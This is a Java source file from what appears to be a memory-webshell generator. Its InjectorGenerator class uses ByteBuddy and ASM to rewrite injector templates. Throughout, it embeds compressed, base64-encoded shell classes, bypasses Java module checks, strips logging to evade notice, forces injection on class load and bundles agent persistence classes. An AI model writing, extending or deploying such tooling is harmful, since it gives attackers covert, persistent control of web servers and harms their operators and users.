package com.reajason.javaweb.memshell.generator;

import com.reajason.javaweb.ClassBytesShrink;
import com.reajason.javaweb.agent.AgentInjectorSupport;
import com.reajason.javaweb.agent.AgentPersistence;
import com.reajason.javaweb.asm.ClassReferenceVisitor;
import com.reajason.javaweb.asm.InnerClassDiscovery;
import com.reajason.javaweb.buddy.*;
import com.reajason.javaweb.memshell.ShellType;
import com.reajason.javaweb.memshell.config.InjectorConfig;
import com.reajason.javaweb.memshell.config.ShellConfig;
import com.reajason.javaweb.utils.CommonUtil;
import lombok.SneakyThrows;
import net.bytebuddy.ByteBuddy;
import net.bytebuddy.description.type.TypeDescription;
import net.bytebuddy.dynamic.ClassFileLocator;
import net.bytebuddy.dynamic.DynamicType;
import net.bytebuddy.dynamic.scaffold.TypeValidation;
import net.bytebuddy.implementation.FixedValue;
import net.bytebuddy.pool.TypePool;
import org.objectweb.asm.ClassReader;

import java.util.*;

import static net.bytebuddy.matcher.ElementMatchers.named;

/**
 * @author ReaJason
 * @since 2024/11/24
 */
public class InjectorGenerator {
    private static final String INJECTOR_SUPPORT_INTERNAL_NAME =
            AgentInjectorSupport.class.getName().replace('.', '/');

    private final ShellConfig shellConfig;
    private final InjectorConfig injectorConfig;

    public InjectorGenerator(ShellConfig shellConfig, InjectorConfig injectorConfig) {
        this.shellConfig = shellConfig;
        this.injectorConfig = injectorConfig;
    }

    @SneakyThrows
    public DynamicType.Builder<?> getBuilder() {
        String base64String = Base64.getEncoder().encodeToString(CommonUtil.gzipCompress(injectorConfig.getShellClassBytes()));
        String originalClassName = injectorConfig.getInjectorTemplateClassName();
        String newClassName = injectorConfig.getInjectorClassName();

        ClassLoader templateClassLoader = templateClassLoader();
        ClassFileLocator classFileLocator = ClassFileLocator.ForClassLoader.of(templateClassLoader);
        TypeDescription templateType = TypePool.Default.of(classFileLocator).describe(originalClassName).resolve();

        DynamicType.Builder<?> builder = new ByteBuddy()
                .redefine(templateType, classFileLocator)
                .visit(new TargetJreVersionVisitorWrapper(shellConfig.getTargetJreVersion()))
                .visit(new ClassRenameVisitorWrapper(originalClassName, newClassName))
                .method(named("getUrlPattern")).intercept(FixedValue.value(Objects.toString(injectorConfig.getUrlPattern(), "/*")))
                .method(named("getBase64String")).intercept(FixedValue.value(base64String))
                .method(named("getClassName")).intercept(FixedValue.value(injectorConfig.getShellClassName()));

        byte[] helperClassBytes = injectorConfig.getHelperClassBytes();
        if (helperClassBytes != null) {
            String helperBase64 = Base64.getEncoder().encodeToString(CommonUtil.gzipCompress(helperClassBytes));
            builder = builder.method(named("getHelperBase64String")).intercept(FixedValue.value(helperBase64));
        }

        if (shellConfig.needByPassJavaModule()) {
            builder = ByPassJavaModuleInterceptor.extend(builder);
        }

        if (shellConfig.isJakarta()) {
            builder = builder.visit(ServletRenameVisitorWrapper.INSTANCE);
        }

        if (shellConfig.isDebugOff()) {
            builder = LogRemoveMethodVisitor.extend(builder);
        }

        if (injectorConfig.isStaticInitialize() && !shellConfig.getShellType().startsWith(ShellType.AGENT)) {
            builder = StaticBlockSelfConstructorCall.extend(builder);
        }
        return builder;
    }

    @SneakyThrows
    public Map<String, byte[]> getInnerClassBytes() {
        String originalClassName = injectorConfig.getInjectorTemplateClassName();
        ClassLoader templateClassLoader = templateClassLoader();
        Set<String> innerClassNames = InnerClassDiscovery.findAllInnerClasses(originalClassName, templateClassLoader);

        String newClassName = injectorConfig.getInjectorClassName();

        ClassFileLocator classFileLocator = ClassFileLocator.ForClassLoader.of(templateClassLoader);
        TypePool typePool = TypePool.Default.of(classFileLocator);

        Map<String, byte[]> bytes = new HashMap<>();
        for (String innerClassName : innerClassNames) {
            TypeDescription innerTypeDesc = typePool.describe(innerClassName).resolve();
            String newInnerClassName = innerClassName.replace(originalClassName, newClassName);
            DynamicType.Builder<?> innerBuilder = new ByteBuddy()
                    .with(TypeValidation.DISABLED)
                    .redefine(innerTypeDesc, classFileLocator)
                    .visit(new TargetJreVersionVisitorWrapper(shellConfig.getTargetJreVersion()))
                    .visit(new ClassRenameVisitorWrapper(originalClassName, newClassName));

            try (DynamicType.Unloaded<?> unloaded = innerBuilder.make()) {
                for (Map.Entry<TypeDescription, byte[]> entry : unloaded.getAllTypes().entrySet()) {
                    bytes.put(newInnerClassName, entry.getValue());
                }
            }
        }
        TypeDescription templateType = typePool.describe(originalClassName).resolve();
        boolean persistent = !templateType.getDeclaredMethods().filter(named("persist")).isEmpty();
        if (persistent) {
            addCompanionClasses(classFileLocator, typePool, bytes, companionClasses(AgentPersistence.class));
        }
        // AgentPersistence 依赖 AgentInjectorSupport，声明 persist 的模板一并打包，避免伴随类缺半边。
        if (persistent || referencesInjectorSupport(classFileLocator, originalClassName)) {
            addCompanionClasses(classFileLocator, typePool, bytes, companionClasses(AgentInjectorSupport.class));
        }
        return bytes;
    }

    @SneakyThrows
    private static Set<String> companionClasses(Class<?> companion) {
        Set<String> companions = new LinkedHashSet<String>();
        companions.add(companion.getName());
        companions.addAll(InnerClassDiscovery.findAllInnerClasses(companion));
        return companions;
    }

    @SneakyThrows
    private void addCompanionClasses(ClassFileLocator classFileLocator, TypePool typePool,
                                     Map<String, byte[]> bytes, Set<String> companionClasses) {
        for (String companionClass : companionClasses) {
            TypeDescription type = typePool.describe(companionClass).resolve();
            DynamicType.Builder<?> builder = new ByteBuddy()
                    .with(TypeValidation.DISABLED)
                    .redefine(type, classFileLocator)
                    .visit(new TargetJreVersionVisitorWrapper(shellConfig.getTargetJreVersion()));
            try (DynamicType.Unloaded<?> unloaded = builder.make()) {
                for (Map.Entry<TypeDescription, byte[]> entry : unloaded.getAllTypes().entrySet()) {
                    bytes.put(entry.getKey().getName(), entry.getValue());
                }
            }
        }
    }

    @SneakyThrows
    private static boolean referencesInjectorSupport(ClassFileLocator classFileLocator, String templateClassName) {
        ClassFileLocator.Resolution resolution = classFileLocator.locate(templateClassName);
        if (!resolution.isResolved()) {
            return false;
        }
        ClassReferenceVisitor visitor = new ClassReferenceVisitor();
        new ClassReader(resolution.resolve()).accept(visitor, ClassReader.SKIP_DEBUG | ClassReader.SKIP_FRAMES);
        for (String reference : visitor.getReferencedClasses()) {
            if (reference.equals(INJECTOR_SUPPORT_INTERNAL_NAME)
                    || reference.startsWith(INJECTOR_SUPPORT_INTERNAL_NAME + "$")) {
                return true;
            }
        }
        return false;
    }

    @SneakyThrows
    public byte[] generate() {
        DynamicType.Builder<?> builder = getBuilder();
        try (DynamicType.Unloaded<?> make = builder.make()) {
            return ClassBytesShrink.shrink(make.getBytes(), shellConfig.isShrink());
        }
    }

    /**
     * Injector templates ship inside the server modules; MemShellGenerator anchors the
     * server module's class loader on the config. Fall back to the context/own loader for
     * direct API callers.
     */
    private ClassLoader templateClassLoader() {
        ClassLoader classLoader = injectorConfig.getInjectorTemplateClassLoader();
        if (classLoader == null) {
            classLoader = Thread.currentThread().getContextClassLoader();
        }
        if (classLoader == null) {
            classLoader = InjectorGenerator.class.getClassLoader();
        }
        return classLoader;
    }
}